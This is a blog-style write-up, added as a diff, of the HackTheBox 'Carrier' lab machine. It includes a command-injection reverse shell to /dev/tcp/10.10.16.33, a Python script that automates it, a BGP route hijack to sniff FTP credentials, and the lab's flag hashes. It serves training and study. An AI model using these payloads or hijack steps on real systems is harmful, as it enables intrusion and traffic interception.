@@ -1,0 +1,526 @@
+---
+layout: default
+title: Carrier
+---
+
+<div class="pretty-font">
+<h1>Carrier</h1>
+<p class="date">16/03/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/carrier/carrier.png">
+
+<p>Carrier is, at first, quite easy. You have to interact with some udp service and, to get the initial shell, make a command injection attack. Get the root flag is more challenging, at least for me, because it requires some network knowledge I didn't have. You need to understand and play with <code>BGP</code> to execute a MitM attack.</p> 
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>First run a nmap listing versions and running default scripts. We can only see <code>ssh</code> on port <code>22</code>, an <code>apache</code> running on port <code>80</code>, and port <code>21</code> seems to be filtered.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/carrier# nmap -sC -sV 10.10.10.105
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-22 14:41 EST
+Nmap scan report for 10.10.10.105
+Host is up (0.052s latency).
+Not shown: 997 closed ports
+PORT   STATE    SERVICE    VERSION
+21/tcp filtered ftp
+22/tcp open     tcpwrapped
+| ssh-hostkey: 
+|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
+|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
+80/tcp open     http       Apache httpd 2.4.18 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Login
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.39 seconds
+</pre>
+
+<p>If we also run an udp scan, port <code>161</code> appears to be also opened, probably with a <code>snmp</code> service running.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/carrier# nmap -sU -T5 10.10.10.105
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-22 15:11 EST
+Warning: 10.10.10.105 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.10.105
+Host is up (0.045s latency).
+Not shown: 927 open|filtered ports, 72 closed ports
+PORT    STATE SERVICE
+161/udp open  snmp
+
+Nmap done: 1 IP address (1 host up) scanned in 79.65 seconds
+</pre>
+
+<p>We're going to run <code>dirb</code> to scan web content on the apache server.</p>
+
+<pre class="prettyprint long">
+root@kali:~/htb/carrier# dirb http://10.10.10.105/
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Jan 22 14:45:22 2019
+URL_BASE: http://10.10.10.105/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.10.105/ ----
+==> DIRECTORY: http://10.10.10.105/css/
+==> DIRECTORY: http://10.10.10.105/debug/
+==> DIRECTORY: http://10.10.10.105/doc/
+==> DIRECTORY: http://10.10.10.105/fonts/
+==> DIRECTORY: http://10.10.10.105/img/
++ http://10.10.10.105/index.php (CODE:200|SIZE:1509)
+==> DIRECTORY: http://10.10.10.105/js/
++ http://10.10.10.105/server-status (CODE:403|SIZE:300)
+==> DIRECTORY: http://10.10.10.105/tools/
+
+---- Entering directory: http://10.10.10.105/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://10.10.10.105/debug/ ----
++ http://10.10.10.105/debug/index.php (CODE:200|SIZE:83057)
+
+---- Entering directory: http://10.10.10.105/doc/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://10.10.10.105/fonts/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://10.10.10.105/img/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://10.10.10.105/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://10.10.10.105/tools/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+
+-----------------
+END_TIME: Tue Jan 22 14:52:45 2019
+DOWNLOADED: 9224 - FOUND: 3                                              
+</pre>
+
+<p>Reviewing all directories we have the following interesting files.</p>
+
+<p>In <code>index.php</code> we have a login to some Lyghtspeed platform.</p>
+
+<img class="img-fluid" src="/static/img/htb/carrier/1.png">
+
+<p>In <code>doc/diagram_for_tac.png</code>, we have an schema of some sort of network. This will help us later.</p>
+
+<img class="img-fluid" src="/static/img/htb/carrier/diagram_for_tac.png">
+
+<p>And in <code>doc/error_codes.pdf</code>, we have documentarion about Lyghtspeed.</p>
+
+<img class="img-fluid" src="/static/img/htb/carrier/2.png">
+
+<p>On the login page we saw <code>Error 45007</code> and <code>Error 45009</code> were present, which means this according to the documentation.</p>
+
+<p class="challenge-description">Error 45007 - License invalid or expired<br>
+Error 45009 - System credentials have not been set / Default admin user password is set (see chassis serial number)</p>
+
+<p>Okay, so now we know the password to login as administrator to the platform is the serial number.</p>
+
+<p>Having that in mind, let's dig into snmp service running <code>snmpwalk</code> on the default community <code>public</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/carrier# snmpwalk -v1 -c public 10.10.10.105
+Created directory: /var/lib/snmp/mib_indexes
+iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
+End of MIB
+</pre>
+
+<p>Yep, that's the serial number. So now we can login with <code>admin/NET_45JDX23</code> and access the platform.</p>
+
+<img class="img-fluid" src="/static/img/htb/carrier/3.png">
+
+<p>As explained on the dashboard we have available a ticket tab where we can read some past tickets and a diagnostics tab. Let's check the last one.</p>
+
+<img class="img-fluid" src="/static/img/htb/carrier/4.png">
+
+<p>If we use <code>burp</code>, we can see that when pressing the <i>Verify status</i> button, the following <code>POST</code> request is made.</p>
+
+<pre class="prettyprint">
+POST /diag.php HTTP/1.1
+Host: 10.10.10.105
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.105/diag.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 14
+Cookie: PHPSESSID=nb9qv1739bouf400a0prqku2t2
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+check=cXVhZ2dh
+</pre>
+
+<p>In the request's data there's a base64 encoded message which translates into <code>quagga</code> and we get the following response back.</p>
+
+<img class="img-fluid" src="/static/img/htb/carrier/5.png">
+
+<p>That looks like some sort of command output, so we are going to try to inject another command replacing <code>quagga</code> for <code>quagga;id</code>.<br>
+Send the same request changing the base64 code and we get the following response.</p>
+
+<img class="img-fluid" src="/static/img/htb/carrier/6.png">
+
+<p>The command injection worked, so instead of running <code>id</code> we are going to try to retrieve a reverse shell using <code>quagga; bash -i >& /dev/tcp/10.10.16.33/6969 0>&1</code>. Run the POST request and, if listening on the specified port, we get a shell.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/carrier# nc -nlvp 6969
+listening on [any] 6969 ...
+connect to [10.10.16.33] from (UNKNOWN) [10.10.10.105] 42880
+bash: cannot set terminal process group (9682): Inappropriate ioctl for device
+bash: no job control in this shell
+root@r1:~# 
+</pre>
+
+<p>We got a shell as root, but seems that we can only see <code>user.txt</code> at first sight.</p>
+
+<pre class="prettyprint">
+root@r1:~# cat user.txt
+cat user.txt
+<span flag="5649c41df59fd6efdc4a78d79a07f2be">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege escalation</h2>
+
+<p>First of all, I made a simple python script to automatize the steps to retrieve the shell, therefore if I need a shell I just have to listen on the specified port and run the script.</p>
+
+<pre class="prettyprint">
+import requests
+import netifaces
+import base64
+
+url = 'http://10.10.10.105/'
+my_ip = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
+payload = 'quagga; bash -i >& /dev/tcp/' + my_ip + '/6969 0>&1'
+b64_payload = base64.b64encode(payload)
+
+s = requests.session()
+s.post(url, data='username=admin&password=NET_45JDX23', headers={'Content-Type':'application/x-www-form-urlencoded'})
+s.post(url+'/diag.php', data='check='+b64_payload, headers={'Content-Type':'application/x-www-form-urlencoded'})
+</pre>
+
+<p>Checking <code>ifconfig</code> we see that we are not even on <code>10.10.10.105</code>, so we will maybe need to do some pivoting.</p>
+
+<pre class="prettyprint">
+root@r1:~# ifconfig	
+ifconfig 
+eth0      Link encap:Ethernet  HWaddr 00:16:3e:d9:04:ea  
+          inet addr:10.99.64.2  Bcast:10.99.64.255  Mask:255.255.255.0
+          inet6 addr: fe80::216:3eff:fed9:4ea/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:286 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:236 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:40265 (40.2 KB)  TX bytes:43070 (43.0 KB)
+
+eth1      Link encap:Ethernet  HWaddr 00:16:3e:8a:f2:4f  
+          inet addr:10.78.10.1  Bcast:10.78.10.255  Mask:255.255.255.0
+          inet6 addr: fe80::216:3eff:fe8a:f24f/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:45 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:26 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:3540 (3.5 KB)  TX bytes:2125 (2.1 KB)
+
+eth2      Link encap:Ethernet  HWaddr 00:16:3e:20:98:df  
+          inet addr:10.78.11.1  Bcast:10.78.11.255  Mask:255.255.255.0
+          inet6 addr: fe80::216:3eff:fe20:98df/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:44 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:23 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:3502 (3.5 KB)  TX bytes:1955 (1.9 KB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:208 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:208 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:16868 (16.8 KB)  TX bytes:16868 (16.8 KB)
+</pre>
+
+<p>Going back to the tickets view, on the Lyghtspeed site, we have one ticket with the following description.</p>
+
+<img class="img-fluid" src="/static/img/htb/carrier/7.png">
+
+<p>According to the ticket, we have an important <code>FTP</code> server in the <code>10.120.15.0/24</code> network, so we will make a simple ping sweep to see which hosts reply.</p>
+
+<pre class="prettyprint">
+root@r1:~# for i in {0..255}; do ping -c 1 -W 1 10.120.15.$i >/dev/null && echo "10.120.15.$i is up"; done                       
+10.120.15.1 is up
+10.120.15.10 is up
+</pre>
+
+<p>Run a <code>nc</code> scan on both hosts and we can confirm that <code>10.120.15.10</code> is running something on port 21, probably an <code>FTP</code> server. So this looks like our target.</p>
+
+<pre class="prettyprint">
+root@r1:~# nc -zv 10.120.15.10 1-65535 2>&1 | grep succeeded
+nc -zv 10.120.15.10 1-65535 2>&1 | grep succeeded
+Connection to 10.120.15.10 21 port [tcp/ftp] succeeded!
+Connection to 10.120.15.10 22 port [tcp/ssh] succeeded!
+Connection to 10.120.15.10 179 port [tcp/bgp] succeeded!
+Connection to 10.120.15.10 38346 port [tcp/*] succeeded!
+Connection to 10.120.15.10 46648 port [tcp/*] succeeded!
+Connection to 10.120.15.10 54082 port [tcp/*] succeeded!
+Connection to 10.120.15.10 60148 port [tcp/*] succeeded!
+</pre>
+
+<p>On the other hand, in <code>opt</code> folder we have the following bash script.</p>
+
+<pre class="prettyprint">
+root@r1:~# cat /opt/restore.sh
+cat /opt/restore.sh
+#!/bin/sh
+systemctl stop quagga
+killall vtysh
+cp /etc/quagga/zebra.conf.orig /etc/quagga/zebra.conf
+cp /etc/quagga/bgpd.conf.orig /etc/quagga/bgpd.conf
+systemctl start quagga
+</pre>
+
+<p>Looks like the machine is working with <code>BGP</code> (Border Gateway Protocol) with <code>quagga</code>, so it seems we will have to do some BGP hijacking, an ancient attack which is a very common even today.</p>
+
+<p>Connect to the <code>vty</code> shell to check the current configuration.</p>
+
+<pre class="prettyprint long">
+root@r1:~# vtysh
+vtysh
+
+Hello, this is Quagga (version 0.99.24.1).
+Copyright 1996-2005 Kunihiro Ishiguro, et al.
+
+r1# show ip bgp
+show ip bgp
+BGP table version is 0, local router ID is 10.255.255.1
+Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
+              i internal, r RIB-failure, S Stale, R Removed
+Origin codes: i - IGP, e - EGP, ? - incomplete
+
+   Network          Next Hop            Metric LocPrf Weight Path
+*> 10.78.10.0/24    0.0.0.0                  0         32768 ?
+*> 10.78.11.0/24    0.0.0.0                  0         32768 ?
+*> 10.99.64.0/24    0.0.0.0                  0         32768 ?
+*  10.100.10.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.11.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.12.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.13.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.14.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.15.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.16.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.17.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.18.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.19.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.20.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*> 10.101.8.0/21    0.0.0.0                  0         32768 i
+*> 10.101.16.0/21   0.0.0.0                  0         32768 i
+*  10.120.10.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.11.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.12.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.13.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.14.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.15.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.16.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.17.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.18.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.19.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.20.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+
+Total number of prefixes 27
+</pre>
+
+<p>Connections to <code>10.120.15.10</code> are being transmitted through <code>10.78.11.2</code>, because it is announcing <code>10.120.15.0/24</code> network. Therefore, to intercept the traffic we will announce a more specific network <code>10.120.15.0/25</code> and our machine will be used as a gateway instead.</p>
+
+<pre class="prettyprint">
+r1# conf t
+conf t
+r1(config)# ip route 10.120.15.0/25 10.78.11.2     
+ip route 10.120.15.0/25 10.78.11.2
+r1(config)# router bgp 100
+router bgp 100
+r1(config-router)# network 10.120.15.0/25
+network 10.120.15.0/25
+r1(config-router)# end
+end
+</pre>
+
+<p>If we check <code>BGP</code> routes we can confirm our <code>10.120.15.0/25</code> network has been included, we can assume our neighbors will receive the information and our machine will then be used as a gateway.</p>
+
+<pre class="prettyprint long">
+r1# show ip bgp
+show ip bgp
+BGP table version is 0, local router ID is 10.255.255.1
+Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
+              i internal, r RIB-failure, S Stale, R Removed
+Origin codes: i - IGP, e - EGP, ? - incomplete
+
+   Network          Next Hop            Metric LocPrf Weight Path
+*> 10.78.10.0/24    0.0.0.0                  0         32768 ?
+*> 10.99.64.0/24    0.0.0.0                  0         32768 ?
+*  10.100.10.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.11.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.12.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.13.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.14.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.15.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.16.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.17.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.18.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.19.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.20.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*> 10.101.8.0/21    0.0.0.0                  0         32768 i
+*> 10.101.16.0/21   0.0.0.0                  0         32768 i
+*  10.120.10.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.11.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.12.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.13.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.14.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*> 10.120.15.0/24   0.0.0.0                  0         32768 ?
+*                   10.78.10.2                             0 200 300 i
+*                   10.78.11.2               0             0 300 i
+*> 10.120.15.0/25   0.0.0.0                  0         32768 i
+*  10.120.16.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.17.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.18.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.19.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.20.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+
+Total number of prefixes 27
+</pre>
+
+<p>Now run <code>tcpdump</code> to inspect traffic going to the FTP server.</p>
+
+<pre class="prettyprint">
+root@r1:~# tcpdump -i any -w caca.pcap -n dst host 10.120.15.10
+</pre>
+
+<p>We can see some credentials that are being sent and we can use (<code>root/BGPtelc0rout1ng</code>).</p>
+
+<pre class="prettyprint">
+root@r1:~# tcpdump -r caca.pcap
+reading from file caca.pcap, link-type LINUX_SLL (Linux cooked)
+...
+19:54:01.814065 IP 10.78.10.2.36458 > 10.120.15.10.ftp: Flags [P.], seq 0:11, ack 15, win 229, options [nop,nop,TS val 3398437025 ecr 1779939196], length 11: FTP: USER root
+19:54:01.814179 IP 10.78.10.2.36458 > 10.120.15.10.ftp: Flags [P.], seq 11:33, ack 24, win 229, options [nop,nop,TS val 3398437025 ecr 1779939196], length 22: FTP: PASS BGPtelc0rout1ng
+19:54:01.814353 IP 10.78.10.2.36458 > 10.120.15.10.ftp: Flags [P.], seq 33:39, ack 40, win 229, options [nop,nop,TS val 3398437025 ecr 1779939196], length 6: FTP: PASV
+19:54:01.814562 IP 10.78.10.2.48918 > 10.120.15.10.46237: Flags [S], seq 2646326224, win 29200, options [mss 1460,sackOK,TS val 3398437025 ecr 0,nop,wscale 7], length 0
+19:54:01.814581 IP 10.78.10.2.48918 > 10.120.15.10.46237: Flags [.], ack 2305627788, win 229, options [nop,nop,TS val 3398437025 ecr 1779939196], length 0
+19:54:01.814602 IP 10.78.10.2.36458 > 10.120.15.10.ftp: Flags [P.], seq 39:60, ack 91, win 229, options [nop,nop,TS val 3398437025 ecr 1779939196], length 21: FTP: STOR secretdata.txt
+19:54:01.814812 IP 10.78.10.2.36458 > 10.120.15.10.ftp: Flags [P.], seq 60:66, ack 103, win 229, options [nop,nop,TS val 3398437026 ecr 1779939196], length 6: FTP: QUIT
+...
+</pre>
+
+<p>I couldn't use those credentials to access to the <code>FTP</code> server, but worked to login with <code>ssh</code> into the machine, which is even better.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/carrier# ssh root@10.10.10.105
+root@10.10.10.105's password: BGPtelc0rout1ng
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-24-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Jan 24 20:32:12 UTC 2019
+
+  System load:  0.13               Users logged in:       0
+  Usage of /:   40.8% of 19.56GB   IP address for ens33:  10.10.10.105
+  Memory usage: 37%                IP address for lxdbr0: 10.99.64.1
+  Swap usage:   0%                 IP address for lxdbr1: 10.120.15.10
+  Processes:    282
+
+ * Meltdown, Spectre and Ubuntu: What are the attack vectors,
+   how the fixes work, and everything else you need to know
+   - https://ubu.one/u2Know
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+4 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Wed Sep  5 14:32:15 2018
+root@carrier:~#
+</pre>
+
+<p>On root's directory there's the final flag.</p>
+
+<pre class="prettyprint">
+root@carrier:~# cat root.txt
+<span flag="2832e552061532250ac2a21478fd4866">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+</div>
